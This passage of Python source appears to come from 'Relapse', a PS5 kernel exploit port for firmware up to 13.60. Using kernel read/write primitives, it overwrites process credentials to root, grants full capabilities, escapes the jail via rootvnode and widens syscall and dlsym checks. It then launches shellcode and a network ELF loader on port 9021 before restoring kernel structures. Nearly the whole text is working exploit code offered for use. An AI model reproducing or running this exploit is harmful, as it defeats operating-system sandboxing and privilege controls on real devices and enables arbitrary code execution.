        rv, value = group_read64(address)
        return value if rv == 0 else None

    def read32_at(address):
        rv, value = group_read32(address)
        return value if rv == 0 else None

    fdp = read64_at(curproc_addr + proc["fd"])
    if not is_kernel_pointer(fdp):
        report("Privileges", "no escalation snapshot: file table pointer is invalid")
        return False

    dyn = read64_at(curproc_addr + proc["dynlib"])
    if not is_kernel_pointer(dyn):
        dyn = None

    escalation_orig = {
        "fdp": fdp,
        "cdir": read64_at(fdp + filedesc["cdir"]),
        "rdir": read64_at(fdp + filedesc["rdir"]),
        "jdir": read64_at(fdp + filedesc["jdir"]),
        "dyn": dyn,
        "syscall_start": read64_at(dyn + dynlib["syscallStart"]) if dyn else None,
        "syscall_end": read64_at(dyn + dynlib["syscallEnd"]) if dyn else None,
        "restrict_flags": read32_at(dyn + dynlib["restrictFlags"]) if dyn else None,
        "libkernel_ref": read64_at(dyn + dynlib["libkernelRef"]) if dyn else None,
    }

    stage("escalation snapshot: jdir=%s, syscallEnd=%s, restrictFlags=%s" % (
        "missing" if escalation_orig["jdir"] is None else "%#x" % escalation_orig["jdir"],
        "missing" if escalation_orig["syscall_end"] is None else "%#x" % escalation_orig["syscall_end"],
        "missing" if escalation_orig["restrict_flags"] is None else "%#x" % escalation_orig["restrict_flags"],
    ))
    return True


def escalate():
    global crossed, eboot_segments_ptr, eboot_orig_addr, eboot_orig_size
    if not crossed or not ucred_addr:
        report("Privileges", "kernel rw or credentials are missing")
        return False

    rootvnode = read_kernel_pointer_slow(kaddr(off["rootvnode"]))
    if not rootvnode:
        report("Privileges", "could not find rootvnode")
        return False

    ucred = off["ucred"]
    sys_core_auth_id = off["sysCoreAuthId"]
    filedesc = off["filedesc"]
    dynlib = off["dynlib"]
    proc = off["proc"]
    cred = ucred_addr

    if RESTORE_ESCALATION:
        snapshot_escalation()

    write_kernel32(cred + ucred["uid"], 0)
    write_kernel32(cred + ucred["ruid"], 0)
    write_kernel32(cred + ucred["svuid"], 0)
    write_kernel32(cred + ucred["ngroups"], 1)
    write_kernel32(cred + ucred["rgid"], 0)
    write_kernel32(cred + ucred["svgid"], 0)
    write_kernel64(
        cred + ucred["sceAuthId"],
        (sys_core_auth_id["hi"] << 32) | (sys_core_auth_id["lo"] & M32),
    )
    write_kernel64(cred + ucred["sceCaps"], M64)
    write_kernel64(cred + ucred["sceCaps1"], M64)

    attrs_low = read_kernel32(cred + ucred["sceAttrs"])
    attrs_high = read_kernel32(cred + ucred["sceAttrs"] + 4)
    write_kernel64(
        cred + ucred["sceAttrs"],
        (attrs_high << 32) | ((attrs_low & 0x00FFFFFF) | 0x80000000),
    )

    _, fdp = kread64(curproc_addr + proc["fd"])
    write_kernel64(fdp + filedesc["cdir"], rootvnode)
    write_kernel64(fdp + filedesc["rdir"], rootvnode)
    write_kernel64(fdp + filedesc["jdir"], 0)

    _, dynlib_ptr = kread64(curproc_addr + proc["dynlib"])
    if is_kernel_pointer(dynlib_ptr):
        write_kernel64(dynlib_ptr + dynlib["syscallStart"], 0)
        write_kernel64(dynlib_ptr + dynlib["syscallEnd"], M64)
        write_kernel32(dynlib_ptr + dynlib["restrictFlags"], 0)
        write_kernel64(dynlib_ptr + dynlib["libkernelRef"], 1)

        # dlsym checks the caller against the eboot segment bounds.
        _, eboot_ptr = kread64(dynlib_ptr)
        if is_kernel_pointer(eboot_ptr):
            _, segments_ptr = kread64(eboot_ptr + 0x40)
            if is_kernel_pointer(segments_ptr):
                _, orig_addr = kread64(segments_ptr + 0x08)
                _, orig_size = kread64(segments_ptr + 0x10)
                write_kernel64(segments_ptr + 0x08, 0)
                write_kernel64(segments_ptr + 0x10, M64)
                eboot_segments_ptr = segments_ptr
                eboot_orig_addr = orig_addr
                eboot_orig_size = orig_size
    else:
        report("Privileges", "dynlib pointer is invalid")

    uid_after = sysint(sc.syscalls.getuid)
    sandbox_after = sysint(sc.syscalls.is_in_sandbox)
    ok_flag = uid_after == 0 and sandbox_after == 0
    if not ok_flag:
        report("Privileges", "uid or sandbox check failed")
    return ok_flag


# ---- aio cleanup ---------------------------------------------------------

def group_read32(address):
    if not crossed:
        return kread32(address)
    if kread_fast(address, 4, scratch_qword) == 4:
        return 0, u32(scratch_qword, 0)
    return -1, 0


def group_read64(address):
    if not crossed:
        return kread64(address)
    if kread_fast(address, 8, scratch_qword) == 8:
        return 0, q64(scratch_qword, 0)
    return -1, 0


def group_write32(address, value):
    if not crossed:
        return kwrite32(address, value)
    p32(scratch_qword, 0, value)
    if kwrite_fast(address, 4, scratch_qword) == 4:
        return 0
    return -1


def group_read_pointer(address):
    rv, value = group_read64(address)
    if rv == 0 and is_kernel_pointer(value):
        return value
    return None


def lookup_aio_group(table_addr, id_):
    id_table = off["aio"]["idTable"]
    index = id_ & 0x1FFF

    page_count_rv, page_count = group_read32(table_addr + id_table["pages"])
    if page_count_rv != 0 or page_count == 0 or page_count > 64:
        return None
    if index >= (page_count << 7):
        return None

    page = group_read_pointer(table_addr + (index >> 7) * 8)
    if not page:
        return None

    slot = page + (id_ & 0x7F) * id_table["slotStride"]

    gen_rv, generation = group_read32(slot + 0x28)
    if gen_rv != 0:
        return None
    if (((generation & 0xFFFF) << 13) | index) & 0xFFFF != id_:
        return None

    state_rv, state = group_read32(slot + 0x24)
    if state_rv != 0 or (state >> 16) != 3:
        return None

    type_rv, entry_type = group_read32(slot + 0x20)
    if type_rv != 0 or (entry_type & 0xFFFF) != id_table["entryType"]:
        return None

    return group_read_pointer(slot + 0x10)


def defuse_aio_groups():
    global defused
    if not curproc_addr:
        report("cleanup", "current process is missing")
        return False

    _, table_addr = group_read64(curproc_addr + off["proc"]["aioInfo"])
    if not is_kernel_pointer(table_addr):
        report("cleanup", "aio table pointer is invalid")
        return False

    num_off = off["aio"]["group"]["num"]
    state_off = off["aio"]["group"]["state"]
    waiters_off = off["aio"]["group"]["waiters"]
    total, already_clear, cleared, skipped, failed = 0, 0, 0, 0, 0

    for ids in armed_groups:
        for id_ in ids:
            total += 1

            group = lookup_aio_group(table_addr, id_)
            if not group:
                skipped += 1
                continue
            shared = group_read_pointer(group + 0x10)
            if not shared:
                skipped += 1
                continue
            _, group_num = group_read32(shared + num_off)
            _, group_state = group_read32(shared + state_off)
            if group_num != 1 or group_state < 1 or group_state > 4:
                skipped += 1
                continue
            _, head = group_read64(shared + waiters_off)
            if (head & M64) == 0:
                already_clear += 1
                continue
            ok_flag = False
            for _ in range(3):
                if ok_flag:
                    break
                group_write32(shared + waiters_off, 0)
                group_write32(shared + waiters_off + 4, 0)
                _, back = group_read64(shared + waiters_off)
                ok_flag = (back & M64) == 0
            if ok_flag:
                cleared += 1
            else:
                failed += 1

    ok_flag = skipped == 0 and failed == 0 and (cleared + already_clear) == total
    defused = True
    if not ok_flag:
        report(
            "cleanup",
            "aio cleanup failed (%d skipped, %d failed)" % (skipped, failed),
        )
    return ok_flag


# ---- payload launch ------------------------------------------------------


def launch_shellcode():
    return kexp.launch(
        {
            "kbase": kbase,
            "proc_fd_addr": proc_fd_addr,
            "off": off,
            "master": master,
            "victim": victim,
            "curproc": curproc_addr,
            "restore_thread_attributes": restore_thread_attributes,
            "kaddr": kaddr,
            "report": report,
            "hex": hex,
            "stage": stage,
            "prot_rwx": PROT_RWX,
            "libkernel_handle": kexp.LIBKERNEL_HANDLE,
            "libc_handle": LIBC_HANDLE,
            "kread_fast": kread_fast,
            "kwrite_fast": kwrite_fast,
            "on_handoff": on_handoff,
        }
    )


def on_handoff():
    global handed_off
    handed_off = True


# ---- restore -------------------------------------------------------------


def restore_escalation():
    global escalation_restored
    o = escalation_orig
    if not o:
        report("Cleanup", "no escalation snapshot - fd_* and dynlib left mutated")
        return False
    if not crossed:
        report("Cleanup", "fast window is gone, escalation restore skipped")
        return False

    filedesc = off["filedesc"]
    dynlib = off["dynlib"]
    restore_dirs = RESTORE_FD_CDIR_RDIR

    count = {"ok": 0, "want": 0}

    def put64(address, value):
        if value is None:
            return
        count["want"] += 1
        if write_kernel64(address, value):
            count["ok"] += 1

    def put32(address, value):
        if value is None:
            return
        count["want"] += 1
        if write_kernel32(address, value):
            count["ok"] += 1

    fdp = o["fdp"]
    if restore_dirs:
        put64(fdp + filedesc["cdir"], o["cdir"])
        put64(fdp + filedesc["rdir"], o["rdir"])
    put64(fdp + filedesc["jdir"], o["jdir"])

    dyn = o["dyn"]
    restore_dyn = bool(dyn) and RESTORE_DYNLIB_RANGE
    if restore_dyn:
        put64(dyn + dynlib["syscallStart"], o["syscall_start"])
        put64(dyn + dynlib["syscallEnd"], o["syscall_end"])
        put32(dyn + dynlib["restrictFlags"], o["restrict_flags"])
        put64(dyn + dynlib["libkernelRef"], o["libkernel_ref"])

    jdir_back = read_kernel64(fdp + filedesc["jdir"])
    end_back = read_kernel64(dyn + dynlib["syscallEnd"]) if restore_dyn else None
    cdir_back = read_kernel64(fdp + filedesc["cdir"]) if restore_dirs else None
    rdir_back = read_kernel64(fdp + filedesc["rdir"]) if restore_dirs else None

    verified = o["jdir"] is not None and jdir_back == o["jdir"]
    if restore_dyn:
        verified = (
            verified
            and o["syscall_end"] is not None
            and o["restrict_flags"] is not None
            and o["syscall_end"] == end_back
        )
    if restore_dirs:
        verified = (
            verified
            and o["cdir"] is not None
            and o["rdir"] is not None
            and cdir_back == o["cdir"]
            and rdir_back == o["rdir"]
        )

    escalation_restored = count["ok"] == count["want"] and verified

    report(
        "Cleanup",
        "%d/%d escalation writes back, jdir now %#x, syscallEnd now %s"
        % (
            count["ok"],
            count["want"],
            jdir_back,
            ("0x%x" % end_back) if restore_dyn else "left widened",
        )
        + (
            ", cdir/rdir left at rootvnode so post-exploit paths resolve"
            if not restore_dirs
            else ", cdir now %#x, rdir now %#x" % (cdir_back, rdir_back)
        )
        + (
            ""
            if escalation_restored
            else " - NOT fully restored, the app kill path may still walk a "
            "directory tree this process does not own"
        )
    )
    return escalation_restored


def restore_oids():
    if not crossed:
        return
    a = off["oid"]["a"]
    b = off["oid"]["b"]
    c = off["oid"]["c"]
    original_kind = off["oid"]["originalKind"]

    global mib_c
    for oid in (a, b, c):
        kwrite64(kaddr(oid["arg1"]), kaddr(oid["arg1Value"]))
    for oid in (a, b, c):
        kwrite32(kaddr(oid["kind"]), original_kind)
    kwrite32(kaddr(b["visible"]), 0)
    kwrite32(kaddr(a["deadSink"]), 0)
    kwrite32(kaddr(off["walkCounter"]["addr"]), 0)

    mib_c = None

    cpus_rv, _ = sysctl_read_int(mib_a)
    still_visible = oid_kind(mib_b) is not None
    ok_flag = cpus_rv == 0 and not still_visible
    if not ok_flag:
        report("Cleanup", "oid restore check failed")


def restore_pipes():
    global pipes_disarmed, crossed
    if not crossed or pipes_disarmed:
        return True
    if not saved_pipe_buffers:
        report(
            "Cleanup", "original pipe buffers were not saved; pipes remain armed"
        )
        return False

    buffer_off = off["pipe"]["buffer"]
    size_off = off["pipe"]["size"]
    fields = [
        (master["pipe"], saved_pipe_buffers["master"], saved_pipe_buffers["master_size"]),
        (victim["pipe"], saved_pipe_buffers["victim"], saved_pipe_buffers["victim_size"]),
    ]
    for pipe, buffer, size in fields:
        kwrite64(pipe + buffer_off, buffer)
        kwrite32(pipe + size_off, size)
        kwrite32(pipe + off["pipe"]["count"], 0)
        kwrite32(pipe + off["pipe"]["in"], 0)
        kwrite32(pipe + off["pipe"]["out"], 0)

    master_rv, master_buffer = kread64(master["pipe"] + buffer_off)
    victim_rv, victim_buffer = kread64(victim["pipe"] + buffer_off)
    master_size_rv, master_size = kread32(master["pipe"] + size_off)
    victim_size_rv, victim_size = kread32(victim["pipe"] + size_off)
    ok_flag = (
        master_rv == 0
        and victim_rv == 0
        and master_size_rv == 0
        and victim_size_rv == 0
        and master_buffer == saved_pipe_buffers["master"]
        and victim_buffer == saved_pipe_buffers["victim"]
        and master_size == saved_pipe_buffers["master_size"]
        and victim_size == saved_pipe_buffers["victim_size"]
    )
    if ok_flag:
        pipes_disarmed = True
        crossed = False
        ok_msg("original pipe buffers restored and verified")
    else:
        report("Cleanup", "pipe restoration failed; pipes may panic on close")
    return ok_flag


def restore_eboot_segments():
    global eboot_segments_ptr
    if not eboot_segments_ptr:
        return
    kwrite64(eboot_segments_ptr + 0x08, eboot_orig_addr)
    kwrite64(eboot_segments_ptr + 0x10, eboot_orig_size)

    _, back = kread64(eboot_segments_ptr + 0x10)
    if back != eboot_orig_size:
        report("Cleanup", "eboot segment bounds were not restored")


def release_aio_workers():
    global worker_park
    if not worker_park:
        return
    try:
        sysint(sc.syscalls.close, worker_park["write_fd"])
        msleep(120)
        sysint(sc.syscalls.close, worker_park["read_fd"])
    except:
        report("Cleanup", "could not release aio workers")


def close_scratch_descriptors():
    global fds
    keep = []
    if master:
        keep.append(master)
    if victim:
        keep.append(victim)

    seen = {}
    for fd in fds:
        if fd in seen:
            continue
        seen[fd] = True
        keep_fd = False
        for pipe in keep:
            if pipe["read_fd"] == fd or pipe["write_fd"] == fd:
                keep_fd = True
                break
        if not keep_fd:
            sysint(sc.syscalls.close, fd)


# ---- run -----------------------------------------------------------------


def stop(why):
    report("Kernel", "stopped: " + why)
    return {"kbase": kbase, "done": True, "payloads": False, "stopped": True}


def rescue():
    try:
        if pinned_core != -1 and not thread_attrs_restored:
            restore_thread_attributes()

        if len(armed_groups) > 0 and not defused:
            stage("repairing aio groups")
            if not curproc_addr:
                find_current_process()
            if curproc_addr:
                defuse_aio_groups()
            else:
                report("Cleanup", "current process unavailable")

        if RESTORE_ESCALATION and escalation_orig:
            restore_escalation()

        restore_eboot_segments()
        if not restore_pipes():
            if (
                master
                and victim
                and kexp.bump_refcount(master["read_file"], kread32, kwrite32)
                and kexp.bump_refcount(master["write_file"], kread32, kwrite32)
                and kexp.bump_refcount(victim["read_file"], kread32, kwrite32)
                and kexp.bump_refcount(victim["write_file"], kread32, kwrite32)
            ):
                report("Cleanup", "pipe file references pinned after restoration failure")
            else:
                report(
                    "Cleanup", "could not pin pipe file references after restoration failure"
                )
        restore_oids()
        release_aio_workers()
        close_scratch_descriptors()
    except:
        report("Cleanup", "failed")


def run():
    global off
    gc.disable()
    stage("Starting kernel exploit")

    result = None
    ok_flag = False
    try:
        leak_kernel_base()
        ok_msg("kbase: %#x" % kbase)
        pin_to_single_core()

        if not arm_kernel_read_write():
            result = stop("armings did not complete")
        else:
            stage("kernel r/w ready")

            if not find_current_process():
                result = stop("curproc not found")
            elif not locate_pipes():
                result = stop("pipes not located")
            else:
                stage("pipes located")
                if not cross_pipes():
                    result = stop("fast read and write not established")
                else:
                    stage("kernel fast r/w ready")

                    stage("checking aio groups")
                    defuse_aio_groups()

                    stage("checking privileges")
                    if not escalate():
                        result = stop("escalation did not clear")
                    else:
                        stage("privileges ready")

                        payloads = launch_shellcode()
                        stage(payloads and "payloads loaded" or "finished")
                        result = {"kbase": kbase, "done": True, "payloads": payloads}
                        ok_flag = True
    except Exception as exc:
        result = str(exc)

    rescue()

    if not ok_flag:
        if isinstance(result, dict) and result.get("stopped"):
            return result
        report("Kernel", str(result))
        raise Exception(str(result))

    return result


MAX_SUPPORTED_FIRMWARE = "13.60"


def relapse_kexploit():
    global off
    gc.disable()

    _ = sc.syscalls.aio_multi_poll
    _ = sc.syscalls.aio_multi_cancel
    _ = sc.syscalls.ioctl

    if sc.is_jailbroken:
        if IGNORE_STATE_CHECKS:
            log("[*] process is already jailbroken, running anyway (state checks disabled)")
        else:
            log("[*] process is already jailbroken, nothing to do")
            return None

    elfldr_path = kexp.find_payload_file("@@ELFLDR_FILE@@", "elfldr-ps5.elf")
    kexp_path = kexp.find_payload_file("@@KEXP_FILE@@", "kexp.bin")

    if not elfldr_path or not kexp_path:
        log("[-] elfldr or kexp binary missing from savedata, update autoloader savedata")
        return None

    log("[+] Relapse port by PLK")
    log(
        "[+] Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. YenYen, TheFlow, SlidyBat, "
        "Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion"
    )

    off = get_relapse_offset(sc.version)
    if not off:
        if _fw_num(sc.version) > _fw_num(MAX_SUPPORTED_FIRMWARE):
            log(
                "[-] firmware %s is newer than 13.60, which is not supported" % sc.version
            )
        else:
            log("[-] firmware %s is not supported" % sc.version)
        return None

    log("[+] Firmware %s" % sc.version)

    result = run()
    if result and result.get("payloads"):
        log("[+] kernel exploit complete, we are root!")
        try:
            console_ip = sc.get_current_ip()
        except:
            console_ip = None
        log("[+] elfldr is listening on %s:9021" % (console_ip or "unknown"))
        SHARED_VARS["IS_KEXP"] = True
    elif result and result.get("stopped"):
        log("[+] kernel exploit stopped")
    elif result:
        log("[+] kernel exploit complete, root privileges enabled")
        SHARED_VARS["IS_KEXP"] = True

    return result


def _fw_num(version):
    major, minor = version.split(".")
    return (int(major), int(minor))


# ---- entry ---------------------------------------------------------------

relapse_kexploit()
